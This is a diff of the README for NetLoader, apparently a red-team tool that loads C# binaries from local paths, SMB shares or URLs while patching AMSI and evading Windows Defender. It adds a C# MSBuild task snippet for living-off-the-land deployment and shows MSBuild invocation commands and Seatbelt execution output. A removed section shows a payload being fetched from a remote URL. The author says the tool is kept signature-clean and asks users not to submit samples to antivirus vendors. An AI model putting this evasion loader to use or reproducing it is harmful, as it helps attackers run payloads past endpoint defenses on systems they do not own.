@@ -1,7 +1,7 @@
 # NetLoader
 Loads any C# binary from filepath or url, patching AMSI and bypassing Windows Defender on runtime
 
-Latest update / signature fix was 21.06.2020, clean as a whistle
+Latest update / signature fix was 23.06.2020, clean as a whistle
 I am doing 24/7 signature checks and pushing updates when possible so I can keep NetLoader undetected (mainly for my own educational purposes).
 **Please do not upload to VirusTotal and DISABLE "Sample Submission" when testing / possible**
 
@@ -14,7 +14,17 @@ I am doing 24/7 signature checks and pushing updates when possible so I can keep
 # Deploy via LOLBin (MSBuild)
 
 Payload for MSBuild is in the /LOLBins folder, might push this for varius other LOLBins aswell.
-NetLoader has to be used in interactive mode when deployed using MSBuild
+Arguments have to be added into the bottom XML file when NetLoader is deployed using MSBuild
+
+	Adding arguments to the XML payload
+	    public class ClassExample : Task, ITask
+	    {
+	        public override bool Execute()
+	        {	//Add your arguments here 
+	            SoullikePrincelier.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
+	            return true;
+	        }
+	    }
 
 	For 64 bit:
 	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml
@@ -23,7 +33,7 @@ NetLoader has to be used in interactive mode when deployed using MSBuild
 	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
 
 # Usage
-Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote), non-interactive
+Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote)
 
 	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --path Seatbelt.exe --args whoami
 	[!] ~Flangvik , ~Arno0x #NetLoader
@@ -53,7 +63,7 @@ Deploy payload from local path or SMB share (note that NetLoader automatically d
 	[*] Completed collection in 0,008 seconds
 
 
-Supports base64 inputs for those long strings that would usually break stuff! (non-interactive)
+Supports base64 inputs for those long strings that would usually break stuff! 
 
 	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --b64 --path U2VhdGJlbHQuZXhl --args d2hvYW1p
 	[!] ~Flangvik , ~Arno0x #NetLoader
@@ -83,39 +93,6 @@ Supports base64 inputs for those long strings that would usually break stuff! (n
 
 	[*] Completed collection in 0,006 seconds
 
-Deploy payload from remote URI with args, input is base64 in interactive mode
-
-	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe
-	[!] ~Flangvik , ~Arno0x #NetLoader
-	[?] Input X in any field to exit!
-	[?] Is all input base64 encoded ? y/n -> y
-	[?] Input path or url -> aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL1NoYXJwQ29sbGVjdGlvbi9yYXcvbWFzdGVyL05ldEZyYW1ld29ya180LjBfeDY0L1NlYXRiZWx0LmV4ZQ==
-	[?] Is the payload data XOR encrypted ? y/n -> n
-	[?] Input payload args (optional) -> d2hvYW1p
-	[+] Successfully patched AMSI!
-	[+] URL/PATH : https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Seatbelt.exe
-	[+] Arguments : whoami
-
-
-							%&&@@@&&
-							&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
-							&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
-	%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
-	#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
-	#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
-	#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
-	#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
-	###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
-	#####%######################  %%%..                       @////(((&%%%%%%%################
-							&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
-							&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
-							 #%%%%##,
-
-
-	ERROR: Error running command "whoami"
-
-
-	[*] Completed collection in 0,004 seconds
 
 # Todo
 - [X]  Automate the build and release of many of the Sharp Tools so they automagically appear in ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) (CDI / Azure DevOps)
